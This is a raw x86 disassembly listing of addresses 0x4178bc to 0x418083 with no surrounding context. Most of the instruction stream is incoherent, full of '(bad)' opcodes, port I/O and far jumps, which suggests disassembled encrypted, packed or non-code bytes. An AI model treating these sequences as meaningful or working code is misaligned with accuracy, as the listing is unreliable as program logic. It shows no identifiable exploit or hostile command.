  4178bc:	or     eax,0xef37bcc
  4178c1:	mov    al,0xf5
  4178c3:	sahf   
  4178c4:	sbb    eax,0x725d94a4
  4178c9:	cmp    al,0xc
  4178cb:	(bad)  
  4178cc:	pop    ebx
  4178cd:	or     dl,BYTE PTR [eax-0x25]
  4178d0:	pop    edi
  4178d1:	xchg   esi,eax
  4178d2:	xor    ch,ch
  4178d4:	cmp    al,0x37
  4178d6:	jecxz  0x41793c
  4178d8:	or     ch,BYTE PTR [edi-0x1b]
  4178db:	push   ds
  4178dc:	push   es
  4178dd:	inc    edi
  4178de:	iretw  
  4178e0:	std    
  4178e1:	arpl   bp,sp
  4178e3:	jns    0x4178e0
  4178e5:	jnp    0x417959
  4178e7:	pop    es
  4178e8:	jae    0x417934
  4178ea:	loopne 0x41792c
  4178ec:	and    al,BYTE PTR [edi]
  4178ee:	and    DWORD PTR [esi-0x1a80616c],edi
  4178f4:	test   BYTE PTR [eax+0x778ed17c],ch
  4178fa:	push   esi
  4178fb:	mov    dh,BYTE PTR [edi-0x70]
  4178fe:	or     cl,bh
  417900:	pop    edx
  417901:	lock jnp 0x41794f
  417904:	inc    DWORD PTR [esi]
  417906:	aad    0xb1
  417908:	jno    0x4178b8
  41790a:	mov    ss,eax
  41790c:	es push 0xe01fc4fd
  417912:	xor    BYTE PTR [eax-0x7a08eff7],ah
  417918:	xchg   esp,eax
  417919:	cmc    
  41791a:	aaa    
  41791b:	inc    ebx
  41791c:	stc    
  41791d:	xor    ebp,eax
  41791f:	or     BYTE PTR [ebx],0x8
  417922:	pop    ebp
  417923:	stos   DWORD PTR es:[edi],eax
  417924:	aad    0x35
  417926:	sbb    eax,0x74053f47
  41792b:	and    al,0xd4
  41792d:	daa    
  41792e:	add    edx,edx
  417930:	jae    0x4178c9
  417932:	jmp    0x417905
  417934:	in     al,dx
  417935:	xchg   DWORD PTR [eax+0x67],ecx
  417938:	pusha  
  417939:	or     eax,edx
  41793b:	mov    dl,0x78
  41793d:	in     eax,dx
  41793e:	fidiv  DWORD PTR [edi+eiz*8-0x3d1f8922]
  417945:	rcl    DWORD PTR [esi+eax*4],0xc3
  417949:	sub    eax,0xb85bfff1
  41794e:	rcr    DWORD PTR [esi+0x1b],cl
  417951:	add    esp,DWORD PTR [ecx+edx*1+0x46945432]
  417958:	mov    DWORD PTR [ecx+0x50],ebx
  41795b:	cmc    
  41795c:	lods   eax,DWORD PTR ds:[esi]
  41795d:	ins    BYTE PTR es:[edi],dx
  41795e:	sbb    DWORD PTR [ecx+0x2e],edi
  417961:	outs   dx,DWORD PTR ds:[esi]
  417962:	or     al,0xed
  417964:	pop    es
  417965:	inc    esi
  417966:	mov    ch,0xe8
  417968:	aad    0x26
  41796a:	(bad)  
  41796b:	jns    0x417961
  41796d:	and    DWORD PTR ds:0x3963e8b9,ebx
  417973:	mov    al,ds:0x9d35e909
  417978:	in     eax,dx
  417979:	mov    eax,ds:0xa718d9fa
  41797e:	xor    bl,al
  417980:	mov    edx,0xfeefba7b
  417985:	aam    0x23
  417987:	xor    esp,DWORD PTR [eax+0x2a]
  41798a:	popf   
  41798b:	push   ss
  41798c:	add    DWORD PTR [ecx+0x7a],ebx
  41798f:	es mov esi,0xb3dbdee0
  417995:	cs leave 
  417997:	loop   0x417a02
  417999:	xor    eax,0xad933138
  41799e:	fs call 0xcd36:0x32e76808
  4179a6:	mov    al,ds:0x82066be6
  4179ab:	stos   BYTE PTR es:[edi],al
  4179ac:	call   0x410c9c73
  4179b1:	arpl   WORD PTR [ecx+0xa],bp
  4179b4:	mov    al,0x3b
  4179b6:	mov    al,0x32
  4179b8:	jge    0x417993
  4179ba:	push   edi
  4179bb:	sbb    BYTE PTR [ebp+0x6e46b1],ah
  4179c1:	fsubr  DWORD PTR [ebp-0x1d]
  4179c4:	or     dl,al
  4179c6:	(bad)  
  4179c7:	mov    ds:0x41e242e8,eax
  4179cc:	popa   
  4179cd:	test   BYTE PTR ds:0x4f5bd68c,0x27
  4179d4:	push   ss
  4179d5:	pop    esi
  4179d6:	cmc    
  4179d7:	and    edi,DWORD PTR [ebx]
  4179d9:	push   ecx
  4179da:	mov    BYTE PTR [edx-0x607b71ed],bh
  4179e0:	popf   
  4179e1:	cdq    
  4179e2:	or     al,0x9
  4179e4:	sub    al,0x86
  4179e6:	jp     0x417a10
  4179e8:	mov    cl,0x65
  4179ea:	push   edi
  4179eb:	sbb    ebp,DWORD PTR [eax]
  4179ed:	ficomp DWORD PTR [esp+ebp*1]
  4179f0:	adc    DWORD PTR [ebp+0x36dee355],edx
  4179f6:	mov    DWORD PTR [ebx+ebp*4],eax
  4179f9:	pop    edi
  4179fa:	div    DWORD PTR [eax+0x7faaa816]
  417a00:	out    dx,eax
  417a01:	and    eax,0xe00d69be
  417a06:	(bad)  
  417a07:	push   0x77c95dd5
  417a0c:	aad    0x5e
  417a0e:	xchg   edx,eax
  417a0f:	jb     0x4179d9
  417a11:	xchg   ecx,eax
  417a12:	push   ebp
  417a13:	int3   
  417a14:	inc    edi
  417a15:	jnp    0x4179dd
  417a17:	dec    ebx
  417a18:	sub    BYTE PTR [eax],cl
  417a1a:	rol    DWORD PTR [eax+eiz*8-0x23a0640],0x38
  417a22:	sbb    bl,BYTE PTR ds:0xc2485789
  417a28:	jg     0x417a4f
  417a2a:	and    eax,0xd46ce3c4
  417a2f:	adc    esp,0xffffff87
  417a32:	in     al,0x95
  417a34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a35:	or     BYTE PTR [eax+0x6c6745de],ch
  417a3b:	cmc    
  417a3c:	shr    BYTE PTR [edi-0x21],cl
  417a3f:	sbb    DWORD PTR [eax-0x159a503a],esi
  417a45:	sub    ebp,DWORD PTR fs:[edi+0x2ffdf69]
  417a4c:	fs cli 
  417a4e:	sbb    al,0x67
  417a50:	repz inc ebx
  417a52:	and    DWORD PTR [ebx+0x683e1f66],eax
  417a58:	test   eax,0xa6784582
  417a5d:	mov    ch,0x12
  417a5f:	inc    edx
  417a60:	jmp    0x471f:0xd6a1e811
  417a67:	call   0xe82:0x257e2776
  417a6e:	jo     0x417a99
  417a70:	mov    ds:0xd20532f6,al
  417a75:	ss xchg ebp,eax
  417a77:	xchg   esi,eax
  417a78:	dec    edi
  417a79:	inc    ebp
  417a7a:	push   0x8f8dcf4a
  417a7f:	fisub  DWORD PTR [esi-0x14c3fe38]
  417a85:	test   al,0x50
  417a87:	in     al,dx
  417a88:	sti    
  417a89:	jb     0x417acf
  417a8b:	add    esp,edx
  417a8d:	pop    esp
  417a8e:	inc    ecx
  417a8f:	fs ja  0x417a3e
  417a92:	int    0xd3
  417a94:	jno    0x417ae1
  417a96:	xor    al,ah
  417a98:	fisttp DWORD PTR [esp+ecx*4]
  417a9b:	sbb    eax,0xc8bb4f65
  417aa0:	xchg   ecx,eax
  417aa1:	neg    DWORD PTR [edi-0x3ebe444c]
  417aa7:	(bad)  
  417aa8:	fist   DWORD PTR [ebp+0x3ef8992d]
  417aae:	clc    
  417aaf:	in     al,0xe2
  417ab1:	xchg   edi,eax
  417ab2:	lahf   
  417ab3:	or     bl,BYTE PTR [ebx+0x16]
  417ab6:	cmp    ebx,esi
  417ab8:	jp     0x417ab2
  417aba:	clc    
  417abb:	js     0x417adb
  417abd:	pusha  
  417abe:	add    al,0xcc
  417ac0:	xor    ebx,DWORD PTR [ecx+0x3eb12fe0]
  417ac6:	add    ecx,DWORD PTR [ebp+0x680d12e3]
  417acc:	push   edi
  417acd:	sub    ebx,0x27bdb93e
  417ad3:	fcmovbe st,st(7)
  417ad5:	add    ch,BYTE PTR [ebp+0x4a]
  417ad8:	cmp    al,0x52
  417ada:	and    eax,0x6146b0cd
  417adf:	cdq    
  417ae0:	test   BYTE PTR [esi],cl
  417ae2:	rcl    DWORD PTR [ebp-0xd85c13],cl
  417ae8:	(bad)  
  417aea:	shr    BYTE PTR [edx-0x2b],1
  417aed:	sahf   
  417aee:	jp     0x417b57
  417af0:	arpl   WORD PTR [eax+0x53],si
  417af3:	add    al,0x3d
  417af5:	fucom  st(0)
  417af7:	adc    al,BYTE PTR [esi-0x1c]
  417afa:	adc    bh,BYTE PTR [ebx+0x2da5acb9]
  417b00:	dec    esp
  417b01:	push   0x9a1b5a21
  417b06:	sbb    DWORD PTR [esi-0x1c],eax
  417b09:	pop    edi
  417b0a:	mov    eax,0x9440e1b9
  417b0f:	int3   
  417b10:	mov    ebx,cs
  417b12:	push   edi
  417b13:	imul   edi,DWORD PTR [eax+0x74276061],0x6257fb87
  417b1d:	xlat   BYTE PTR ds:[ebx]
  417b1e:	in     eax,dx
  417b1f:	pop    edx
  417b20:	and    DWORD PTR [edi],eax
  417b22:	div    esp
  417b24:	add    al,0x1b
  417b26:	xor    esp,DWORD PTR [esi-0x36]
  417b29:	pusha  
  417b2a:	repz (bad) 
  417b2d:	int    0xe6
  417b2f:	add    bh,al
  417b31:	or     esp,ebx
  417b33:	mov    DWORD PTR [edx-0x5f],eax
  417b36:	dec    ebx
  417b37:	ss or  bl,dh
  417b3a:	icebp  
  417b3b:	ins    BYTE PTR es:[edi],dx
  417b3c:	jne    0x417adc
  417b3e:	mov    ebp,0xc9199a5c
  417b43:	aad    0x6f
  417b45:	(bad)  [ecx]
  417b47:	(bad)  
  417b48:	mov    esi,0xa18f547b
  417b4d:	out    dx,al
  417b4e:	sub    eax,0x86220155
  417b53:	pop    ss
  417b54:	nop
  417b55:	out    dx,eax
  417b56:	mov    ebx,0xe2b057bf
  417b5b:	out    dx,eax
  417b5c:	pushf  
  417b5d:	jl     0x417b5c
  417b5f:	bound  edi,QWORD PTR [edx]
  417b61:	xor    al,0x63
  417b63:	adc    eax,0x188286d1
  417b68:	test   DWORD PTR [eax+ecx*4],0x7f0fd67d
  417b6f:	mov    ecx,0x5a6d98dd
  417b74:	push   ecx
  417b75:	daa    
  417b76:	in     al,0xcc
  417b78:	pusha  
  417b79:	les    ecx,FWORD PTR [esi]
  417b7b:	inc    esi
  417b7c:	push   edi
  417b7d:	fisub  DWORD PTR [edi+0x28]
  417b80:	int3   
  417b81:	les    ebp,FWORD PTR [esi+edi*1-0x1ad8404c]
  417b88:	(bad)  
  417b89:	imul   BYTE PTR [ecx+0xe]
  417b8c:	loop   0x417bc4
  417b8e:	xchg   ecx,eax
  417b8f:	fstp   DWORD PTR [ebx+esi*4-0x249e3e8b]
  417b96:	push   es
  417b97:	das    
  417b98:	fs ret 
  417b9a:	(bad)  
  417b9b:	mov    ebp,0x32b1c59
  417ba0:	aad    0x82
  417ba2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ba3:	xchg   ebx,eax
  417ba4:	aaa    
  417ba5:	push   ds
  417ba6:	iret   
  417ba7:	jg     0x417bf2
  417ba9:	mov    al,0x6b
  417bab:	inc    ecx
  417bac:	cld    
  417bad:	out    0xec,eax
  417baf:	sti    
  417bb0:	adc    al,0xd4
  417bb2:	retf   
  417bb3:	mov    dl,0x41
  417bb5:	retf   
  417bb6:	(bad)  
  417bb7:	mov    ?,ebp
  417bb9:	mov    cl,0xfd
  417bbb:	inc    esi
  417bbc:	or     bl,BYTE PTR [ebp-0x4599c592]
  417bc2:	aad    0x63
  417bc4:	or     cl,BYTE PTR [edi]
  417bc6:	jb     0x417bf3
  417bc8:	fwait
  417bc9:	push   0xffffffd5
  417bcb:	hlt    
  417bcc:	fcmovnbe st,st(4)
  417bce:	bound  edi,QWORD PTR [eax+0x62]
  417bd1:	pop    esp
  417bd2:	ret    
  417bd3:	and    ch,BYTE PTR gs:[edi+0x10]
  417bd7:	es enter 0x2627,0xad
  417bdc:	mov    edx,0x90534b0e
  417be1:	fcmovnb st,st(6)
  417be3:	in     eax,dx
  417be4:	in     eax,dx
  417be5:	ret    0xfc7e
  417be8:	das    
  417be9:	stc    
  417bea:	jmp    0xc49c:0xddf7f1bc
  417bf1:	push   ebx
  417bf2:	mov    DWORD PTR [ebx],esi
  417bf4:	cwde   
  417bf5:	xchg   esp,eax
  417bf6:	js     0x417bf2
  417bf8:	xlat   BYTE PTR ds:[ebx]
  417bf9:	out    0x7f,eax
  417bfb:	push   0x66
  417bfd:	pop    es
  417bfe:	pop    edi
  417c00:	pop    eax
  417c01:	out    0x8e,eax
  417c03:	repz pusha 
  417c05:	aam    0xf3
  417c07:	(bad)  
  417c08:	(bad)  
  417c09:	outs   dx,BYTE PTR ds:[esi]
  417c0a:	ret    
  417c0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c0c:	mov    ss,WORD PTR [eax]
  417c0e:	rcr    BYTE PTR [ecx+0x7c0a1ff9],1
  417c14:	daa    
  417c15:	loop   0x417c58
  417c17:	popf   
  417c18:	pop    ebp
  417c19:	hlt    
  417c1a:	sbb    eax,0x3314f20e
  417c1f:	lahf   
  417c20:	xchg   edx,eax
  417c21:	or     ebx,DWORD PTR [ebp-0x5944c887]
  417c27:	rcr    DWORD PTR [edi-0x3c],0xbc
  417c2b:	mov    edx,0x964f7876
  417c30:	pusha  
  417c31:	iret   
  417c32:	sbb    DWORD PTR [eax-0x78380f67],eax
  417c38:	jns    0x417c2d
  417c3a:	dec    edi
  417c3b:	mov    ebp,0x8f24b34b
  417c40:	xlat   BYTE PTR ds:[ebx]
  417c41:	cmp    BYTE PTR [edi],cl
  417c43:	pop    edi
  417c44:	(bad)  
  417c45:	in     al,dx
  417c46:	sahf   
  417c47:	mov    ebp,0xd4aad019
  417c4c:	mov    al,ds:0xf2de15da
  417c51:	repnz mov edx,0x459a6563
  417c57:	mov    edx,0xc57eeec
  417c5c:	jl     0x417c92
  417c5e:	shl    DWORD PTR [ecx+0x61],0x75
  417c62:	mov    BYTE PTR [edi+0x5d],0xc9
  417c66:	clc    
  417c67:	lock out 0x7,eax
  417c6a:	pop    ebp
  417c6b:	pop    edx
  417c6c:	inc    eax
  417c6d:	call   0x7843:0x1500592e
  417c74:	and    bh,ah
  417c76:	jp     0x417c5a
  417c78:	dec    esi
  417c79:	mov    WORD PTR [eax],ss
  417c7b:	(bad)  
  417c7c:	sbb    ecx,DWORD PTR [ecx+0x3b61c9d1]
  417c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c83:	mov    WORD PTR [edx+0x5b],?
  417c86:	out    dx,eax
  417c87:	push   esi
  417c88:	push   cs
  417c89:	shr    DWORD PTR [ecx+0x6e],cl
  417c8c:	test   al,0x24
  417c8e:	sub    eax,0xeb665818
  417c93:	or     eax,0x940815bc
  417c98:	xlat   BYTE PTR ds:[ebx]
  417c99:	sahf   
  417c9a:	xchg   bh,ch
  417c9c:	jmp    0x417cc7
  417c9e:	repz shl bh,1
  417ca1:	scas   al,BYTE PTR es:[edi]
  417ca2:	test   eax,0xe9f5d4ba
  417ca7:	aam    0x83
  417ca9:	loope  0x417d20
  417cab:	sub    DWORD PTR [esi+0x5be8565f],esp
  417cb1:	out    0xdd,eax
  417cb3:	cmp    esp,ebx
  417cb5:	mov    ds:0x7ccf027f,al
  417cba:	repnz xchg ebx,eax
  417cbc:	sbb    edi,DWORD PTR [edx+0x2db65c1c]
  417cc2:	test   eax,0xc67c734e
  417cc7:	fcom   DWORD PTR [ebx-0x2d]
  417cca:	mov    ebx,0x49b22b67
  417ccf:	daa    
  417cd0:	das    
  417cd1:	lods   al,BYTE PTR ds:[esi]
  417cd2:	into   
  417cd3:	fwait
  417cd4:	xchg   esi,eax
  417cd6:	xchg   esi,eax
  417cd7:	jae    0x417d20
  417cd9:	inc    esi
  417cda:	add    eax,0xd5003a47
  417cdf:	fcomi  st,st(4)
  417ce1:	outs   dx,BYTE PTR ds:[esi]
  417ce2:	cs pop eax
  417ce4:	add    eax,0x497b39be
  417ce9:	pusha  
  417cea:	aam    0xe8
  417cec:	inc    edx
  417ced:	adc    bh,ah
  417cef:	mov    eax,0x77c831e6
  417cf4:	dec    ecx
  417cf5:	repz mov eax,ds:0x6a690728
  417cfb:	mov    edx,0x3656f3c3
  417d00:	xchg   ecx,eax
  417d01:	je     0x417cdc
  417d03:	dec    ebp
  417d04:	cli    
  417d05:	sahf   
  417d06:	mov    DWORD PTR [edi-0x525bb92b],esi
  417d0c:	arpl   WORD PTR [ebp-0x622f98f3],cx
  417d12:	push   ds
  417d13:	fadd   QWORD PTR [ecx-0x3672a066]
  417d19:	stos   DWORD PTR es:[edi],eax
  417d1a:	fcomip st,st(2)
  417d1c:	lock mov al,0xbe
  417d1f:	loop   0x417cef
  417d21:	gs dec eax
  417d23:	mov    cl,0xff
  417d25:	push   0x9c0a1c2
  417d2a:	push   0xf447e829
  417d2f:	retf   0x9292
  417d32:	jne    0x417ceb
  417d34:	push   ss
  417d35:	in     eax,0x64
  417d37:	fucom  st(0)
  417d39:	mov    edi,0x67dc7be3
  417d3e:	jns    0x417d3c
  417d40:	sub    eax,0x7be06878
  417d45:	mov    bl,0xc4
  417d47:	int3   
  417d48:	lods   eax,DWORD PTR ds:[esi]
  417d49:	cmp    ebp,DWORD PTR [edx+0x433e906b]
  417d4f:	loope  0x417d56
  417d51:	inc    ebp
  417d52:	call   0x93b632d4
  417d57:	jmp    0xb11d:0x637a641d
  417d5e:	adc    ebx,DWORD PTR [ebx+edi*1+0x2c]
  417d62:	fst    DWORD PTR [ebp-0x33be74dc]
  417d68:	popa   
  417d69:	push   esp
  417d6a:	sbb    edi,DWORD PTR [esi-0x100e200e]
  417d70:	mov    edi,0x3778d29
  417d75:	arpl   WORD PTR [esi-0x6e],cx
  417d78:	popa   
  417d79:	dec    edi
  417d7a:	enter  0x5ef0,0x8a
  417d7e:	rcl    BYTE PTR [esi-0x376b89fa],1
  417d84:	pop    esi
  417d85:	dec    ecx
  417d86:	sub    ebp,DWORD PTR [edx+0x36]
  417d89:	jb     0x417dec
  417d8b:	adc    al,0x94
  417d8d:	and    DWORD PTR [edi+0x45a22c12],ebx
  417d93:	stc    
  417d94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d95:	adc    edi,ecx
  417d97:	xchg   esi,eax
  417d98:	scas   eax,DWORD PTR es:[edi]
  417d99:	jae    0x417db7
  417d9b:	sbb    eax,0x1c86ec0a
  417da0:	(bad)  
  417da2:	mov    eax,0x839fe790
  417da7:	lock or al,0x1
  417daa:	jge    0x417da3
  417dac:	adc    dl,BYTE PTR [ecx-0x2a]
  417daf:	hlt    
  417db0:	(bad)  
  417db1:	xor    al,0xf6
  417db3:	adc    BYTE PTR [esi],dh
  417db5:	jbe    0x417df5
  417db7:	lock imul esp,DWORD PTR [ebx+0x4d],0x12
  417dbc:	pop    es
  417dbd:	(bad)  
  417dbe:	fdiv   QWORD PTR [esi+0x1b64265e]
  417dc4:	cmp    dh,BYTE PTR [eax]
  417dc6:	push   0xffffffff
  417dc8:	mul    BYTE PTR ds:0xb5488006
  417dce:	cmc    
  417dcf:	in     al,0x8
  417dd1:	inc    edx
  417dd2:	(bad)  
  417dd3:	mov    dl,0x6a
  417dd5:	retf   0xc27f
  417dd8:	out    dx,eax
  417dd9:	ja     0x417d68
  417ddb:	outs   dx,BYTE PTR ds:[esi]
  417ddc:	sar    BYTE PTR [ebx-0xc],1
  417ddf:	gs sub al,0xb2
  417de2:	jecxz  0x417e00
  417de4:	pop    DWORD PTR [edx+edi*1-0x77]
  417de8:	imul   ecx,edx,0xcf7d15b
  417dee:	fcomp  QWORD PTR [edx+0x70]
  417df1:	inc    eax
  417df2:	pop    eax
  417df3:	mov    eax,ds:0xeede3377
  417df8:	loopne 0x417dd6
  417dfa:	dec    ebx
  417dfb:	das    
  417dfc:	sbb    esi,DWORD PTR [edi+0x79]
  417dff:	sub    DWORD PTR [ecx-0x6],edi
  417e02:	dec    edi
  417e03:	lods   al,BYTE PTR ds:[esi]
  417e04:	pop    esp
  417e05:	out    dx,eax
  417e06:	outs   dx,DWORD PTR ds:[esi]
  417e07:	sbb    DWORD PTR [ebp+0x55677706],edx
  417e0d:	push   cs
  417e0e:	or     DWORD PTR [ecx],esp
  417e10:	and    al,0x53
  417e12:	int3   
  417e13:	add    bh,cl
  417e15:	and    eax,0x3ade4d78
  417e1a:	add    BYTE PTR [esi-0x2d],al
  417e1d:	inc    edi
  417e1e:	mul    BYTE PTR [ecx-0x56]
  417e21:	loope  0x417e15
  417e23:	cmp    BYTE PTR ds:0x9fae9bb3,al
  417e29:	add    DWORD PTR [ebx-0x751fb275],ebx
  417e2f:	mov    WORD PTR ds:0xffffff5c,cs
  417e35:	mov    edx,DWORD PTR [ebp+0xc]
  417e38:	cmp    cl,BYTE PTR [edx]
  417e3a:	jne    0x420de3
  417e40:	mov    ecx,DWORD PTR [ebp-0x14]
  417e43:	mov    edx,DWORD PTR [ebp+0xc]
  417e46:	movsx  edx,BYTE PTR [edx]
  417e49:	xor    ecx,eax
  417e4b:	add    ecx,esi
  417e4d:	jmp    0x41a1da
  417e52:	cmp    DWORD PTR [ecx],ecx
  417e54:	mov    ebp,0x79c6ad42
  417e59:	stc    
  417e5a:	mov    DWORD PTR [ebp-0x58],edi
  417e5d:	fxch   st(5)
  417e5f:	pop    ds
  417e60:	call   0xa7a:0x7d38deac
  417e67:	pop    edi
  417e68:	jp     0x417ee4
  417e6a:	dec    DWORD PTR [eax-0x37]
  417e6d:	(bad)  [edi+0x0]
  417e70:	loopne 0x417ee9
  417e72:	jmp    0x6802:0xe44f3ea9
  417e79:	mov    al,0xfa
  417e7b:	fmulp  st(1),st
  417e7d:	dec    eax
  417e7e:	push   esi
  417e7f:	or     eax,0xb30e4ddd
  417e84:	push   esp
  417e85:	in     eax,0xd9
  417e87:	es cmp eax,0xf6e4d843
  417e8e:	lods   eax,DWORD PTR ds:[esi]
  417e8f:	sub    eax,0x890db686
  417e95:	cmc    
  417e96:	jbe    0x417e31
  417e98:	(bad)  
  417e99:	in     eax,dx
  417e9a:	jnp    0x417e22
  417e9c:	das    
  417e9d:	push   eax
  417e9e:	jns    0x417f16
  417ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ea1:	xchg   ecx,eax
  417ea2:	cdq    
  417ea3:	aaa    
  417ea4:	iret   
  417ea5:	xor    al,cl
  417ea7:	call   0x4eb3:0x11a7dd1a
  417eae:	rcl    BYTE PTR [ecx+0x7870df14],1
  417eb4:	in     eax,0xdf
  417eb6:	sub    bl,BYTE PTR [edi+0x6b]
  417eb9:	adc    al,0x6f
  417ebb:	pop    es
  417ebc:	enter  0x9145,0x28
  417ec0:	sub    al,0x72
  417ec2:	sbb    BYTE PTR [ecx+ecx*8+0x124ac662],ah
  417ec9:	mov    ecx,ds
  417ecb:	push   edx
  417ecc:	adc    BYTE PTR [eax+0x60],cl
  417ecf:	jne    0x417f12
  417ed1:	pop    edi
  417ed2:	outs   dx,DWORD PTR ds:[esi]
  417ed3:	mov    WORD PTR ds:0x865a49ac,ds
  417ed9:	and    eax,0x185d4575
  417ede:	xchg   ebp,eax
  417edf:	out    0xfe,al
  417ee1:	sub    BYTE PTR [edx+eax*2-0x30],bh
  417ee5:	pop    ebp
  417ee6:	call   0x155d25e7
  417eeb:	ds mov al,0x94
  417eee:	gs loop 0x417f12
  417ef1:	pop    ebp
  417ef2:	in     eax,0xd9
  417ef4:	je     0x417f21
  417ef6:	in     al,dx
  417ef7:	sar    dh,cl
  417ef9:	push   esp
  417efa:	xor    al,0xc7
  417efc:	cmp    ah,BYTE PTR [eax+0x493832cd]
  417f02:	adc    DWORD PTR [ecx+ecx*4],ebp
  417f05:	iret   
  417f06:	push   eax
  417f07:	jp     0x417eec
  417f09:	mov    eax,ds:0x6a994db1
  417f0e:	(bad)  
  417f10:	ficom  DWORD PTR [esi]
  417f12:	jle    0x417f1c
  417f14:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f16:	fwait
  417f17:	sbb    eax,0x9d66c278
  417f1c:	out    0x65,eax
  417f1e:	cmp    DWORD PTR [eax+0x9],ebx
  417f21:	jge    0x417f66
  417f23:	(bad)  
  417f25:	mov    ds:0x8ee8cdc4,al
  417f2a:	and    dl,ah
  417f2c:	pop    eax
  417f2d:	pop    ss
  417f2e:	or     al,0xb3
  417f30:	and    DWORD PTR [esi+0x2],esi
  417f33:	out    0xff,al
  417f35:	xor    DWORD PTR [edx],0x3e
  417f38:	dec    ecx
  417f39:	dec    esp
  417f3a:	test   eax,0xe4c344db
  417f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f40:	cmp    BYTE PTR [ebx+0x74],cl
  417f43:	iret   
  417f44:	out    0x28,al
  417f46:	sbb    eax,0xa17cec9f
  417f4b:	push   ss
  417f4c:	ret    
  417f4d:	mov    ecx,0xd70de12f
  417f52:	and    DWORD PTR [edx+0x281ff477],edi
  417f58:	and    BYTE PTR [ebx+0x507be7bd],0xfd
  417f5f:	add    BYTE PTR [ecx+0x25],0x91
  417f63:	repz mov edx,0x88603e8e
  417f69:	add    eax,0x3b862f7a
  417f6e:	mov    dl,0x24
  417f70:	daa    
  417f71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f72:	lods   eax,DWORD PTR ds:[esi]
  417f73:	outs   dx,BYTE PTR ds:[esi]
  417f74:	xchg   DWORD PTR [esi],edx
  417f76:	push   ecx
  417f77:	shl    DWORD PTR [eax+0x233294cc],cl
  417f7d:	inc    ebx
  417f7e:	sub    al,0x85
  417f80:	in     eax,0x97
  417f82:	mov    BYTE PTR [eax+0xf33e71],dl
  417f88:	bound  ebp,QWORD PTR [ecx]
  417f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f8b:	lahf   
  417f8c:	stos   BYTE PTR es:[edi],al
  417f8d:	mov    bh,BYTE PTR [esi]
  417f8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f90:	push   esi
  417f91:	hlt    
  417f92:	popa   
  417f93:	and    BYTE PTR [esi],dl
  417f95:	popfw  
  417f97:	pop    esi
  417f98:	and    ecx,DWORD PTR [edi-0xb]
  417f9b:	push   esi
  417f9c:	scas   eax,DWORD PTR es:[edi]
  417f9d:	aam    0x11
  417f9f:	retf   0x926e
  417fa2:	mov    es,WORD PTR [esi-0x2f]
  417fa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fa6:	fdivrp st(5),st
  417fa8:	push   ss
  417fa9:	(bad)  
  417faa:	ja     0x417fea
  417fac:	jnp    0x418024
  417fae:	inc    eax
  417faf:	jne    0x417fdc
  417fb1:	jl     0x417ff8
  417fb3:	pop    ds
  417fb4:	loopne 0x418009
  417fb6:	sub    BYTE PTR [eax+0x1ac09241],dh
  417fbc:	or     al,0x23
  417fbe:	xor    esi,edi
  417fc0:	mov    al,ss:0x67b6b6c7
  417fc6:	jle    0x417fc2
  417fc8:	bound  ebp,QWORD PTR [eax+0x3c9da0b6]
  417fce:	mov    bh,0xaa
  417fd0:	push   ds
  417fd1:	in     eax,dx
  417fd2:	or     ecx,DWORD PTR [edx-0x2b]
  417fd5:	sub    DWORD PTR [bp+si],esp
  417fd8:	add    BYTE PTR [eax+0x1d],bl
  417fdb:	(bad)  
  417fdc:	stos   BYTE PTR es:[edi],al
  417fdd:	inc    eax
  417fde:	push   edi
  417fdf:	mov    dl,0x57
  417fe1:	dec    ebp
  417fe2:	pop    ds
  417fe3:	push   esp
  417fe4:	pop    ss
  417fe5:	out    0x1,al
  417fe7:	lds    esi,FWORD PTR [ebx]
  417fe9:	inc    esp
  417fea:	xchg   DWORD PTR [ebx-0x25cf8b07],esi
  417ff0:	sub    eax,DWORD PTR [esi-0x1626de73]
  417ff6:	push   eax
  417ff7:	mov    ah,0xc6
  417ff9:	or     bh,dl
  417ffb:	cmp    BYTE PTR [ebx-0x447009af],dh
  418001:	dec    edi
  418002:	pop    esp
  418003:	sub    DWORD PTR [ebx],ebx
  418005:	test   DWORD PTR [esi+0x3543ea8a],eax
  41800b:	mov    eax,ds:0x2ba2eac0
  418010:	arpl   WORD PTR [ecx],ax
  418012:	icebp  
  418013:	jle    0x418009
  418015:	pop    esi
  418016:	scas   eax,DWORD PTR es:[edi]
  418017:	sub    BYTE PTR [ecx+0x3401da0b],0xc8
  41801e:	push   edi
  41801f:	enter  0xfe83,0x91
  418023:	sti    
  418024:	mov    dh,0x25
  418026:	dec    edx
  418027:	shl    BYTE PTR [ecx+0xd],cl
  41802a:	jns    0x417fbd
  41802c:	jp     0x417fe2
  41802e:	pop    ss
  41802f:	xlat   BYTE PTR ds:[ebx]
  418030:	add    al,BYTE PTR [edi-0x69]
  418033:	sub    ah,ch
  418035:	pushf  
  418036:	mov    cl,0x93
  418038:	outs   dx,DWORD PTR ds:[esi]
  418039:	out    dx,al
  41803a:	sti    
  41803b:	cmc    
  41803c:	mov    edi,0xf4e96e75
  418041:	cmp    BYTE PTR [ebx],bh
  418043:	mov    edi,0xb1a29d7d
  418048:	xchg   ecx,eax
  418049:	(bad)  
  41804a:	imul   edi,DWORD PTR [eax+ecx*1-0x36],0xffffffaf
  41804f:	ja     0x418053
  418051:	ds inc esp
  418053:	mov    ds:0x4ed41d89,al
  418058:	push   0x5c
  41805a:	mov    esi,0xede7673b
  41805f:	xchg   DWORD PTR ds:0x465e97b7,edi
  418065:	jp     0x41808b
  418067:	mov    dl,0x43
  418069:	mov    al,ds:0x95c43b9
  41806e:	jmp    0xf98ae206
  418073:	(bad)  
  418074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418075:	xchg   BYTE PTR [ecx-0x337c7b73],dl
  41807b:	mov    ecx,DWORD PTR [ebp+ecx*8+0x35]
  41807f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418080:	xchg   edi,eax
  418081:	jecxz  0x4180da
  418083:	cmp    ebp,ebx
